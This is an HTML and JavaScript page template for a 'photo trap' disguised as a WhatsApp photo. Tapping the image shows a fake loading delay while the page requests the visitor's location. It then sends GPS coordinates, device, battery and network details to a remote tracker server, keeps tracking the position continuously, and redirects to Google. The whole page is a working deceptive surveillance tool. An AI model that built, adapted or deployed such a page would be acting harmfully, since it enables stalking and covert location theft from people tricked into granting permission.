<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Photo" />
    <meta property="og:description" content="Tap the photo to view" />
    <meta property="og:image" content="https://i.imgur.com/GHQTMbZ.jpeg" />
    <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/whatsapp/photo" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary_large_image" />
    <title>Photo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: #0a0a0a;
            color: white;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 600px;
            width: 100%;
        }
        .photo-frame {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 10px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
            border: 1px solid #333;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .photo-frame:hover { transform: scale(1.02); }
        .photo-frame img {
            width: 100%;
            border-radius: 8px;
            display: block;
            background: #222;
            min-height: 300px;
            max-height: 600px;
            object-fit: contain;
            pointer-events: none;
        }
        .caption { margin-top: 15px; font-size: 14px; color: #888; }
        .loading-bar {
            width: 100%;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin-top: 10px;
            overflow: hidden;
            display: none;
        }
        .loading-bar .fill {
            height: 100%;
            width: 0%;
            background: #4285f4;
            border-radius: 2px;
            animation: progress 2s ease-in-out forwards;
        }
        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
        .status {
            margin-top: 15px;
            font-size: 13px;
            color: #666;
            min-height: 20px;
        }
        .status.success { color: #4caf50; }
        .status.error { color: #f44336; }
        .status.loading { color: #ffc107; }
        .status.info { color: #42a5f5; }
        .click-hint { margin-top: 8px; font-size: 12px; color: #555; opacity: 0.7; }
        .continue-btn {
            margin-top: 15px;
            padding: 12px 30px;
            background: #4caf50;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: none;
            transition: background 0.2s;
        }
        .continue-btn:hover { background: #388e3c; }
        .reset-link {
            margin-top: 12px;
            font-size: 12px;
            color: #888;
            cursor: pointer;
            text-decoration: underline;
            display: block;
        }
        .reset-link:hover { color: #e94560; }
    </style>
</head>
<body>
    <div class="container">
        <div class="photo-frame" id="photoFrame">
            <img id="photoImg" src="https://i.imgur.com/GHQTMbZ.jpeg" alt="Photo">
        </div>
        <div class="loading-bar" id="loadingBar">
            <div class="fill"></div>
        </div>
        <div class="status" id="status">📸 Tap the photo to load</div>
        <div class="click-hint">👆 Tap the photo to view</div>
        <div class="caption">📷 Photo from camera roll</div>
        <button class="continue-btn" id="continueBtn">➡️ Continue to View</button>
        <a class="reset-link" id="resetLink">🔄 Reset permissions</a>
    </div>

    <script>
        // =============================================
        // BRAND DETECTION
        // =============================================
        const BRAND_FROM_SERVER = '{{ brand }}'.trim();
        const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
        const brandFromPath = (pathParts.length >= 2 && pathParts[1] === 'photo') ? pathParts[0] : null;
        const urlParams = new URLSearchParams(window.location.search);
        const brandFromQuery = urlParams.get('template');
        const template = BRAND_FROM_SERVER || brandFromPath || brandFromQuery || 'whatsapp';
        console.log('📍 Photo trap brand:', template);

        // =============================================
        // CONFIGURATION
        // =============================================
        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
        const customImage = urlParams.get('img');
        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);

        let sessionId = localStorage.getItem('tracker_session_id');
        if (!sessionId) {
            sessionId = 'photo_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
            localStorage.setItem('tracker_session_id', sessionId);
        }

        const statusEl = document.getElementById('status');
        const photoImg = document.getElementById('photoImg');
        const photoFrame = document.getElementById('photoFrame');
        const loadingBar = document.getElementById('loadingBar');
        const continueBtn = document.getElementById('continueBtn');
        const resetLink = document.getElementById('resetLink');

        let locationSent = false;
        let watchId = null;

        if (customImage) photoImg.src = customImage;
        else photoImg.src = 'https://i.imgur.com/GHQTMbZ.jpeg';

        // =============================================
        // HELPERS
        // =============================================
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let deviceName = 'Unknown';
            if (ua.includes('iPhone')) deviceName = 'iPhone';
            else if (ua.includes('iPad')) deviceName = 'iPad';
            else if (ua.includes('Android')) deviceName = 'Android';
            else if (ua.includes('Windows')) deviceName = 'Windows PC';
            else if (ua.includes('Mac')) deviceName = 'Mac';
            return { userAgent: ua, platform: navigator.platform, language: navigator.language, screen: screen.width + 'x' + screen.height, device_name: deviceName, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
        }

        function getBatteryInfo() {
            if (isIOS) return Promise.resolve(null);
            if (navigator.getBattery) return navigator.getBattery().then(b => ({ level: Math.round(b.level * 100), charging: b.charging })).catch(() => null);
            return Promise.resolve(null);
        }

        function getNetworkInfo() {
            if (navigator.connection) return { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink, rtt: navigator.connection.rtt };
            return null;
        }

        function sendLocation(lat, lng, accuracy) {
            const deviceInfo = getDeviceInfo();
            return getBatteryInfo().then(battery => {
                return fetch(RENDER_URL + '/send-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lat, lng, accuracy,
                        device_info: deviceInfo, battery, network: getNetworkInfo(),
                        session_id: sessionId, mode: 'photo_trap_click'
                    })
                });
            });
        }

        function startContinuousTracking() {
            if (watchId !== null) return;
            watchId = navigator.geolocation.watchPosition(
                pos => {
                    const { latitude: lat, longitude: lng, accuracy } = pos.coords;
                    sendLocation(lat, lng, accuracy).catch(() => {});
                },
                () => {},
                { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
            );
        }

        // =============================================
        // GET LOCATION (with fake loading delay)
        // =============================================
        function getLocation() {
            if (locationSent) {
                statusEl.textContent = '✅ Photo loaded! Tap Continue.';
                statusEl.className = 'status success';
                continueBtn.style.display = 'inline-block';
                return;
            }

            if (!navigator.geolocation) {
                statusEl.textContent = '❌ Geolocation not supported';
                statusEl.className = 'status error';
                return;
            }

            loadingBar.style.display = 'block';
            statusEl.textContent = '📸 Loading high-res image...';
            statusEl.className = 'status loading';

            // Fake 1.5s loading delay
            setTimeout(() => {
                statusEl.textContent = '📍 Getting your location...';

                navigator.geolocation.getCurrentPosition(
                    pos => {
                        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
                        sendLocation(lat, lng, accuracy)
                            .then(() => {
                                locationSent = true;
                                startContinuousTracking();
                                statusEl.textContent = '✅ Photo loaded!';
                                statusEl.className = 'status success';
                                loadingBar.style.display = 'none';
                                continueBtn.style.display = 'inline-block';
                            })
                            .catch(() => {
                                locationSent = true;
                                startContinuousTracking();
                                statusEl.textContent = '✅ Photo loaded!';
                                statusEl.className = 'status success';
                                loadingBar.style.display = 'none';
                                continueBtn.style.display = 'inline-block';
                            });
                    },
                    err => {
                        let msg = '⚠️ Location unavailable.';
                        if (err.code === 1) msg = '⚠️ Permission denied. Tap "Reset permissions" below.';
                        else if (err.code === 2) msg = '⚠️ GPS signal not available.';
                        else if (err.code === 3) msg = '⏳ Timeout. Tap the photo again.';
                        statusEl.textContent = msg;
                        statusEl.className = 'status error';
                        loadingBar.style.display = 'none';
                    },
                    { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 }
                );
            }, 1500);
        }

        // =============================================
        // EVENT LISTENERS
        // =============================================
        photoFrame.addEventListener('click', getLocation);

        continueBtn.addEventListener('click', () => {
            window.location.href = 'https://www.google.com';
        });

        resetLink.addEventListener('click', function() {
            statusEl.innerHTML = '📱 To reset: <b>Settings > Safari > Advanced > Website Data</b> → clear <b>' + window.location.hostname + '</b>. Then refresh.';
            statusEl.className = 'status info';
            localStorage.removeItem('tracker_session_id');
            sessionId = 'photo_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
            localStorage.setItem('tracker_session_id', sessionId);
            locationSent = false;
            continueBtn.style.display = 'none';
        });

        window.addEventListener('beforeunload', () => { if (watchId) navigator.geolocation.clearWatch(watchId); });

        console.log('📷 Photo trap with fake loading ready');
    </script>
</body>
</html>
